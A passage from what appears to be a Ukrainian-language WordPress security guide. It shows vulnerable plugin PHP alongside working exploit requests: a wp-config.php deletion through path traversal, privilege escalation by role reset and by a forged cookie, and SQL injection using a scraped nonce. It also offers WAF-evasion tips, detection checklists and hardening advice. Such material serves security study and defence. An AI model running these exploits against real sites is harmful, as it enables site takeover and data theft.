–ê—Ç–∞–∫—É—é—á–∏–π –º–æ–∂–µ –≤–∏–¥–∞–ª–∏—Ç–∏ –±—É–¥—å-—è–∫–∏–π —Ñ–∞–π–ª –∞–±–æ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—é **–Ω–∏–∂—á–µ –±–∞–∑–æ–≤–æ–≥–æ –∫–∞—Ç–∞–ª–æ–≥—É uploads** (–∑–∞–∑–≤–∏—á–∞–π `<wp-root>/wp-content/uploads/`) –≤—ñ–¥–ø—Ä–∞–≤–∏–≤—à–∏ –æ–¥–∏–Ω HTTP POST –∑–∞–ø–∏—Ç:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
–û—Å–∫—ñ–ª—å–∫–∏ `wp-config.php` —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–∏–π –ø–æ–∑–∞ –∫–∞—Ç–∞–ª–æ–≥–æ–º *uploads*, –Ω–∞ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ñ–π —É—Å—Ç–∞–Ω–æ–≤—Ü—ñ –¥–æ—Å—Ç–∞—Ç–Ω—å–æ —á–æ—Ç–∏—Ä—å–æ—Ö –ø–æ—Å–ª—ñ–¥–æ–≤–Ω–æ—Å—Ç–µ–π `../`. –í–∏–¥–∞–ª–µ–Ω–Ω—è `wp-config.php` –ø—Ä–∏–º—É—à—É—î WordPress –ø–µ—Ä–µ–π—Ç–∏ –≤ *–º–∞–π—Å—Ç–µ—Ä –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è* –ø—Ä–∏ –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É –≤—ñ–¥–≤—ñ–¥—É–≤–∞–Ω–Ω—ñ, —â–æ –¥–æ–∑–≤–æ–ª—è—î –ø–æ–≤–Ω–µ –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Å–∞–π—Ç—É (–∞—Ç–∞–∫—É—é—á–∏–π –ø—Ä–æ—Å—Ç–æ –ø–æ–¥–∞—î –Ω–æ–≤—É DB-–∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é —ñ —Å—Ç–≤–æ—Ä—é—î admin-–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞).

–Ü–Ω—à—ñ –∫—Ä–∏—Ç–∏—á–Ω—ñ —Ü—ñ–ª—ñ –≤–∫–ª—é—á–∞—é—Ç—å —Ñ–∞–π–ª–∏ –ø–ª–∞–≥—ñ–Ω—ñ–≤/—Ç–µ–º–∏ `.php` (—â–æ–± –∑–ª–∞–º–∞—Ç–∏ –ø–ª–∞–≥—ñ–Ω–∏ –±–µ–∑–ø–µ–∫–∏) –∞–±–æ –ø—Ä–∞–≤–∏–ª–∞ `.htaccess`.

#### –ß–µ–∫–ª—ñ—Å—Ç –≤–∏—è–≤–ª–µ–Ω–Ω—è

* –ë—É–¥—å-—è–∫–∏–π –æ–±—Ä–æ–±–Ω–∏–∫ `add_action( 'wp_ajax_nopriv_...')`, —è–∫–∏–π –≤–∏–∫–ª–∏–∫–∞—î –¥–æ–ø–æ–º—ñ–∂–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó —Ñ–∞–π–ª–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏ (`copy()`, `unlink()`, `$wp_filesystem->delete()`, —Ç–æ—â–æ).
* –ö–æ–Ω–∫–∞—Ç–µ–Ω–∞—Ü—ñ—è –Ω–µ–æ—á–∏—â–µ–Ω–∏—Ö –¥–∞–Ω–∏—Ö –≤—ñ–¥ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤ —à–ª—è—Ö–∏ (—à—É–∫–∞–π—Ç–µ `$_POST`, `$_GET`, `$_REQUEST`).
* –í—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å `check_ajax_referer()` —Ç–∞ `current_user_can()`/`is_user_logged_in()`.

---

### Privilege escalation —á–µ—Ä–µ–∑ –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –∑–∞—Å—Ç–∞—Ä—ñ–ª–∏—Ö —Ä–æ–ª–µ–π —Ç–∞ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó (ASE "View Admin as Role")

–ë–∞–≥–∞—Ç–æ –ø–ª–∞–≥—ñ–Ω—ñ–≤ —Ä–µ–∞–ª—ñ–∑—É—é—Ç—å —Ñ—É–Ω–∫—Ü—ñ—é "view as role" –∞–±–æ —Ç–∏–º—á–∞—Å–æ–≤–æ—ó –∑–º—ñ–Ω–∏ —Ä–æ–ª—ñ, –∑–±–µ—Ä—ñ–≥–∞—é—á–∏ –ø–æ—á–∞—Ç–∫–æ–≤—ñ —Ä–æ–ª—ñ –≤ user meta, —â–æ–± –ø—ñ–∑–Ω—ñ—à–µ —ó—Ö –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏. –Ø–∫—â–æ —à–ª—è—Ö –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –ø–æ–∫–ª–∞–¥–∞—î—Ç—å—Å—è –ª–∏—à–µ –Ω–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏ –∑–∞–ø–∏—Ç—É (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `$_REQUEST['reset-for']`) —ñ —Å–ø–∏—Å–æ–∫, —è–∫–∏–º –∫–µ—Ä—É—î –ø–ª–∞–≥—ñ–Ω, –±–µ–∑ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ capabilities —Ç–∞ –≤–∞–ª—ñ–¥–Ω–æ–≥–æ nonce, —Ü–µ –ø–µ—Ä–µ—Ç–≤–æ—Ä—é—î—Ç—å—Å—è –Ω–∞ –≤–µ—Ä—Ç–∏–∫–∞–ª—å–Ω–µ privilege escalation.

–†–µ–∞–ª—å–Ω–∏–π –ø—Ä–∏–∫–ª–∞–¥ –±—É–ª–æ –∑–Ω–∞–π–¥–µ–Ω–æ –≤ –ø–ª–∞–≥—ñ–Ω—ñ Admin and Site Enhancements (ASE) (‚â§ 7.6.2.1). –ì—ñ–ª–∫–∞ reset –≤—ñ–¥–Ω–æ–≤–ª—é–≤–∞–ª–∞ —Ä–æ–ª—ñ –Ω–∞ –æ—Å–Ω–æ–≤—ñ `reset-for=<username>`, —è–∫—â–æ —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑'—è–≤–ª—è–ª–æ—Å—è —É –≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ–º—É –º–∞—Å–∏–≤—ñ `$options['viewing_admin_as_role_are']`, –∞–ª–µ –Ω–µ –≤–∏–∫–æ–Ω—É–≤–∞–ª–∞ –Ω—ñ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ `current_user_can()`, –Ω—ñ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ nonce –ø–µ—Ä–µ–¥ –≤–∏–¥–∞–ª–µ–Ω–Ω—è–º –ø–æ—Ç–æ—á–Ω–∏—Ö —Ä–æ–ª–µ–π —Ç–∞ –ø–æ–≤—Ç–æ—Ä–Ω–∏–º –¥–æ–¥–∞–≤–∞–Ω–Ω—è–º –∑–±–µ—Ä–µ–∂–µ–Ω–∏—Ö —Ä–æ–ª–µ–π –∑ user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
–ß–æ–º—É —Ü–µ –º–æ–∂–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏

- –î–æ–≤—ñ—Ä—è—î—Ç—å—Å—è `$_REQUEST['reset-for']` —Ç–∞ –æ–ø—Ü—ñ—ó –ø–ª–∞–≥—ñ–Ω–∞ –±–µ–∑ —Å–µ—Ä–≤–µ—Ä–Ω–æ—ó –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó.
- –Ø–∫—â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á —Ä–∞–Ω—ñ—à–µ –º–∞–≤ –≤–∏—â—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó, –∑–±–µ—Ä–µ–∂–µ–Ω—ñ –≤ `_asenha_view_admin_as_original_roles`, —ñ –π–æ–≥–æ –ø–æ–Ω–∏–∑–∏–ª–∏, –≤—ñ–Ω –º–æ–∂–µ –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏ —ó—Ö, –ø–µ—Ä–µ–π—à–æ–≤—à–∏ –∑–∞ —à–ª—è—Ö–æ–º —Å–∫–∏–¥–∞–Ω–Ω—è.
- –£ –¥–µ—è–∫–∏—Ö —Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è—Ö –±—É–¥—å-—è–∫–∏–π –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º—ñ–≥ –±–∏ —ñ–Ω—ñ—Ü—ñ—é–≤–∞—Ç–∏ —Å–∫–∏–¥–∞–Ω–Ω—è –¥–ª—è —ñ–Ω—à–æ–≥–æ —ñ–º–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —è–∫–µ –≤—Å–µ —â–µ –ø—Ä–∏—Å—É—Ç–Ω—î –≤ `viewing_admin_as_role_are` (–ø–æ—Ä—É—à–µ–Ω–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—è).

–ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è (–ø—Ä–∏–∫–ª–∞–¥)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
–ù–∞ –≤—Ä–∞–∑–ª–∏–≤–∏—Ö –∑–±—ñ—Ä–∫–∞—Ö —Ü–µ –≤–∏–¥–∞–ª—è—î –ø–æ—Ç–æ—á–Ω—ñ —Ä–æ–ª—ñ —Ç–∞ –¥–æ–¥–∞—î –∑–±–µ—Ä–µ–∂–µ–Ω—ñ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—ñ —Ä–æ–ª—ñ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `administrator`), —Ñ–∞–∫—Ç–∏—á–Ω–æ –ø—ñ–¥–≤–∏—â—É—é—á–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó.

Detection checklist

- –®—É–∫–∞–π—Ç–µ —Ñ—É–Ω–∫—Ü—ñ—ó –ø–µ—Ä–µ–∫–ª—é—á–µ–Ω–Ω—è —Ä–æ–ª–µ–π, —è–∫—ñ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å ‚Äú–æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—ñ —Ä–æ–ª—ñ‚Äù –≤ user meta (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `_asenha_view_admin_as_original_roles`).
- –í–∏–∑–Ω–∞—á—Ç–µ —à–ª—è—Ö–∏ —Å–∫–∏–¥–∞–Ω–Ω—è/–≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è, —è–∫—ñ:
- –ß–∏—Ç—É—é—Ç—å —ñ–º–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∑ `$_REQUEST` / `$_GET` / `$_POST`.
- –ú–æ–¥–∏—Ñ—ñ–∫—É—é—Ç—å —Ä–æ–ª—ñ —á–µ—Ä–µ–∑ `add_role()` / `remove_role()` –±–µ–∑ `current_user_can()` —Ç–∞ `wp_verify_nonce()` / `check_admin_referer()`.
- –ê–≤—Ç–æ—Ä–∏–∑—É—é—Ç—å –Ω–∞ –æ—Å–Ω–æ–≤—ñ –º–∞—Å–∏–≤—É –æ–ø—Ü—ñ–π –ø–ª–∞–≥—ñ–Ω–∞ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `viewing_admin_as_role_are`) –∑–∞–º—ñ—Å—Ç—å capabilities –∞–∫—Ç–æ—Ä–∞.

---

### Unauthenticated privilege escalation via cookie‚Äëtrusted user switching on public init (Service Finder ‚Äúsf-booking‚Äù)

–î–µ—è–∫—ñ –ø–ª–∞–≥—ñ–Ω–∏ –ø—ñ–¥–∫–ª—é—á–∞—é—Ç—å –¥–æ–ø–æ–º—ñ–∂–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –ø–µ—Ä–µ–∫–ª—é—á–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –¥–æ –ø—É–±–ª—ñ—á–Ω–æ–≥–æ —Ö—É–∫–∞ `init` —ñ –≤–∏–∑–Ω–∞—á–∞—é—Ç—å —ñ–¥–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å –∑ cookie, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–æ–≥–æ –∫–ª—ñ—î–Ω—Ç–æ–º. –Ø–∫—â–æ –∫–æ–¥ –≤–∏–∫–ª–∏–∫–∞—î `wp_set_auth_cookie()` –±–µ–∑ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó, capability —Ç–∞ –¥—ñ–π—Å–Ω–æ–≥–æ nonce, –±—É–¥—å-—è–∫–∏–π –Ω–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏–π –≤—ñ–¥–≤—ñ–¥—É–≤–∞—á –º–æ–∂–µ –ø—Ä–∏–º—É—Å–æ–≤–æ —É–≤—ñ–π—Ç–∏ —è–∫ –¥–æ–≤—ñ–ª—å–Ω–∏–π user ID.

–¢–∏–ø–æ–≤–∏–π –≤—Ä–∞–∑–ª–∏–≤–∏–π —à–∞–±–ª–æ–Ω (—Å–ø—Ä–æ—â–µ–Ω–æ –∑ Service Finder Bookings ‚â§ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // üî• sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
–ß–æ–º—É —Ü–µ –º–æ–∂–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏

- –ü—É–±–ª—ñ—á–Ω–∏–π —Ö—É–∫ `init` —Ä–æ–±–∏—Ç—å –æ–±—Ä–æ–±–Ω–∏–∫ –¥–æ—Å—Ç—É–ø–Ω–∏–º –¥–ª—è –Ω–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ (–Ω–µ–º–∞—î –∑–∞—Ö–∏—Å—Ç—É `is_user_logged_in()`).
- –Ü–¥–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å –æ—Ç—Ä–∏–º—É—î—Ç—å—Å—è –∑ cookie, —â–æ –º–æ–¥–∏—Ñ—ñ–∫—É—î—Ç—å—Å—è –Ω–∞ –±–æ—Ü—ñ –∫–ª—ñ—î–Ω—Ç–∞ (`original_user_id`).
- –ü—Ä—è–º–∏–π –≤–∏–∫–ª–∏–∫ `wp_set_auth_cookie($uid)` –∑–∞–ª–æ–≥—ñ–Ω—é—î –∑–∞–ø–∏—Ç—É–≤–∞—á–∞ —è–∫ —Ç–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –±–µ–∑ –±—É–¥—å-—è–∫–∏—Ö –ø–µ—Ä–µ–≤—ñ—Ä–æ–∫ capability/nonce.

–ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è (–Ω–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∞)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### –û—Å–æ–±–ª–∏–≤–æ—Å—Ç—ñ WAF –¥–ª—è CVE WordPress/–ø–ª–∞–≥—ñ–Ω—ñ–≤

–ó–∞–≥–∞–ª—å–Ω—ñ edge/server WAF –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –Ω–∞ —à–∏—Ä–æ–∫—ñ —Å–∏–≥–Ω–∞—Ç—É—Ä–∏ (SQLi, XSS, LFI). –ë–∞–≥–∞—Ç–æ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π WordPress/–ø–ª–∞–≥—ñ–Ω—ñ–≤ –∑ –≤–∏—Å–æ–∫–∏–º —Å—Ç—É–ø–µ–Ω–µ–º –≤–ø–ª–∏–≤—É ‚Äî —Ü–µ –±–∞–≥–∏ –ª–æ–≥—ñ–∫–∏/auth –Ω–∞ —Ä—ñ–≤–Ω—ñ –∑–∞—Å—Ç–æ—Å—É–Ω–∫—É, —è–∫—ñ –≤–∏–≥–ª—è–¥–∞—é—Ç—å —è–∫ –¥–æ–±—Ä–æ–∑–∏—á–ª–∏–≤–∏–π —Ç—Ä–∞—Ñ—ñ–∫, —è–∫—â–æ —Ä—É—à—ñ–π –Ω–µ —Ä–æ–∑—É–º—ñ—î –º–∞—Ä—à—Ä—É—Ç–∏ WordPress —Ç–∞ —Å–µ–º–∞–Ω—Ç–∏–∫—É –ø–ª–∞–≥—ñ–Ω—ñ–≤.

–ü–æ—Ä–∞–¥–∏ –¥–ª—è –∞—Ç–∞–∫—É—é—á–æ–≥–æ

- –¶—ñ–ª—å—Ç–µ—Å—è –≤ –µ–Ω–¥–ø–æ—ñ–Ω—Ç–∏, —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω—ñ –¥–ª—è –ø–ª–∞–≥—ñ–Ω–∞, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —á–∏—Å—Ç—ñ payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- –°–ø–æ—á–∞—Ç–∫—É –ø–µ—Ä–µ–≤—ñ—Ä—è–π—Ç–µ –Ω–µ–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω—ñ —à–ª—è—Ö–∏ (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads —á–∞—Å—Ç–æ —Å–ø—Ä–∞—Ü—å–æ–≤—É—é—Ç—å –±–µ–∑ –æ–±—Ñ—É—Å–∫–∞—Ü—ñ—ó.
- –¢–∏–ø–æ–≤—ñ –≤–∏—Å–æ–∫–æ–≤–ø–ª–∏–≤–æ–≤—ñ –≤–∏–ø–∞–¥–∫–∏: privilege escalation (–ø–æ—Ä—É—à–µ–Ω–Ω—è –∫–æ–Ω—Ç—Ä–æ–ª—é –¥–æ—Å—Ç—É–ø—É), arbitrary file upload/download, LFI, open redirect.

–ü–æ—Ä–∞–¥–∏ —â–æ–¥–æ –∑–∞—Ö–∏—Å—Ç—É

- –ù–µ –ø–æ–∫–ª–∞–¥–∞–π—Ç–µ—Å—è –Ω–∞ –∑–∞–≥–∞–ª—å–Ω—ñ —Å–∏–≥–Ω–∞—Ç—É—Ä–∏ WAF –¥–ª—è –∑–∞—Ö–∏—Å—Ç—É CVE –ø–ª–∞–≥—ñ–Ω—ñ–≤. –†–µ–∞–ª—ñ–∑—É–π—Ç–µ –≤—ñ—Ä—Ç—É–∞–ª—å–Ω—ñ –ø–∞—Ç—á—ñ –Ω–∞ —Ä—ñ–≤–Ω—ñ –∑–∞—Å—Ç–æ—Å—É–Ω–∫—É, —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω—ñ –¥–ª—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ, –∞–±–æ –æ–Ω–æ–≤–ª—é–π—Ç–µ—Å—è —à–≤–∏–¥–∫–æ.
- –í—ñ–¥–¥–∞–≤–∞–π—Ç–µ –ø–µ—Ä–µ–≤–∞–≥—É –ø–æ–∑–∏—Ç–∏–≤–Ω–∏–º –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞–º –±–µ–∑–ø–µ–∫–∏ –≤ –∫–æ–¥—ñ (capabilities, nonces, strict input validation) –∑–∞–º—ñ—Å—Ç—å –Ω–µ–≥–∞—Ç–∏–≤–Ω–∏—Ö regex-—Ñ—ñ–ª—å—Ç—Ä—ñ–≤.

## –ó–∞—Ö–∏—Å—Ç WordPress

### –†–µ–≥—É–ª—è—Ä–Ω—ñ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è

–ü–µ—Ä–µ–∫–æ–Ω–∞–π—Ç–µ—Å—è, —â–æ WordPress, –ø–ª–∞–≥—ñ–Ω–∏ —Ç–∞ —Ç–µ–º–∏ –æ–Ω–æ–≤–ª–µ–Ω—ñ. –¢–∞–∫–æ–∂ –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —â–æ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è —É–≤—ñ–º–∫–Ω–µ–Ω–æ –≤ wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
–ö—Ä—ñ–º —Ç–æ–≥–æ, **–≤—Å—Ç–∞–Ω–æ–≤–ª—é–π—Ç–µ –ª–∏—à–µ –Ω–∞–¥—ñ–π–Ω—ñ –ø–ª–∞–≥—ñ–Ω–∏ —Ç–∞ —Ç–µ–º–∏ WordPress**.

### –ü–ª–∞–≥—ñ–Ω–∏ –±–µ–∑–ø–µ–∫–∏

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **–Ü–Ω—à—ñ —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü—ñ—ó**

- –í–∏–¥–∞–ª—ñ—Ç—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º **admin**
- –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ **–Ω–∞–¥—ñ–π–Ω—ñ –ø–∞—Ä–æ–ª—ñ** —Ç–∞ **2FA**
- –ü–µ—Ä—ñ–æ–¥–∏—á–Ω–æ **–ø–µ—Ä–µ–≤—ñ—Ä—è–π—Ç–µ** **–¥–æ–∑–≤–æ–ª–∏** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤
- **–û–±–º–µ–∂—Ç–µ –∫—ñ–ª—å–∫—ñ—Å—Ç—å —Å–ø—Ä–æ–± –≤—Ö–æ–¥—É** –¥–ª—è –∑–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è Brute Force –∞—Ç–∞–∫
- –ü–µ—Ä–µ–π–º–µ–Ω—É–π—Ç–µ —Ñ–∞–π–ª **`wp-admin.php`** —Ç–∞ –¥–æ–∑–≤–æ–ª—è–π—Ç–µ –¥–æ—Å—Ç—É–ø –ª–∏—à–µ –∑—Å–µ—Ä–µ–¥–∏–Ω–∏ –º–µ—Ä–µ–∂—ñ –∞–±–æ –∑ –ø–µ–≤–Ω–∏—Ö IP-–∞–¥—Ä–µ—Å.


### –ù–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏–π SQL Injection —á–µ—Ä–µ–∑ –Ω–µ–¥–æ—Å—Ç–∞—Ç–Ω—é –ø–µ—Ä–µ–≤—ñ—Ä–∫—É (WP Job Portal <= 2.3.2)

–ü–ª–∞–≥—ñ–Ω WP Job Portal –¥–ª—è –ø—ñ–¥–±–æ—Ä—É –ø–µ—Ä—Å–æ–Ω–∞–ª—É –≤—ñ–¥–∫—Ä–∏–≤ –∑–∞–¥–∞—á—É **savecategory**, —è–∫–∞ –∑—Ä–µ—à—Ç–æ—é –≤–∏–∫–æ–Ω—É—î –Ω–∞—Å—Ç—É–ø–Ω–∏–π –≤—Ä–∞–∑–ª–∏–≤–∏–π –∫–æ–¥ —É `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ‚úó
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
–ü—Ä–æ–±–ª–µ–º–∏, —è–∫—ñ –≤–Ω–æ—Å—è—Ç—å —Ü–µ–π —Ñ—Ä–∞–≥–º–µ–Ω—Ç:

1. **–ù–µ—Å–∞–Ω—ñ—Ç–∏–∑–æ–≤–∞–Ω–∏–π –≤–≤—ñ–¥ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞** ‚Äì `parentid` –Ω–∞–¥—Ö–æ–¥–∏—Ç—å –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –∑ HTTP-–∑–∞–ø–∏—Ç—É.
2. **–ö–æ–Ω–∫–∞—Ç–µ–Ω–∞—Ü—ñ—è —Ä—è–¥–∫—ñ–≤ —É WHERE-—É–º–æ–≤—ñ** ‚Äì –≤—ñ–¥—Å—É—Ç–Ω—ñ `is_numeric()` / `esc_sql()` / prepared statement.
3. **Unauthenticated reachability** ‚Äì —Ö–æ—á–∞ –¥—ñ—è –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è —á–µ—Ä–µ–∑ `admin-post.php`, —î–¥–∏–Ω–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ ‚Äî **CSRF nonce** (`wp_verify_nonce()`), —è–∫–∏–π –±—É–¥—å-—è–∫–∏–π –≤—ñ–¥–≤—ñ–¥—É–≤–∞—á –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –∑—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏, —â–æ –≤–±—É–¥–æ–≤—É—î —à–æ—Ä—Ç–∫–æ–¥ `[wpjobportal_my_resumes]`.

#### –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è

1. –û—Ç—Ä–∏–º–∞—Ç–∏ —Å–≤—ñ–∂–∏–π nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. –Ü–Ω–∂–µ–∫—Ç—É–≤–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π SQL, –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏ `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
–í—ñ–¥–ø–æ–≤—ñ–¥—å —Ä–æ–∑–∫—Ä–∏–≤–∞—î —Ä–µ–∑—É–ª—å—Ç–∞—Ç —ñ–Ω–∂–µ–∫—Ç–æ–≤–∞–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É –∞–±–æ –∑–º—ñ–Ω—é—î –±–∞–∑—É –¥–∞–Ω–∏—Ö, —â–æ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂—É—î –Ω–∞—è–≤–Ω—ñ—Å—Ç—å SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

–©–µ –æ–¥–Ω–∞ –∑–∞–¥–∞—á–∞, **downloadcustomfile**, –¥–æ–∑–≤–æ–ª—è–ª–∞ –≤—ñ–¥–≤—ñ–¥—É–≤–∞—á–∞–º –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ **–±—É–¥—å-—è–∫–∏–π —Ñ–∞–π–ª –Ω–∞ –¥–∏—Å–∫—É** —á–µ—Ä–µ–∑ path traversal. –£—Ä–∞–∑–ª–∏–≤–∏–π sink –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
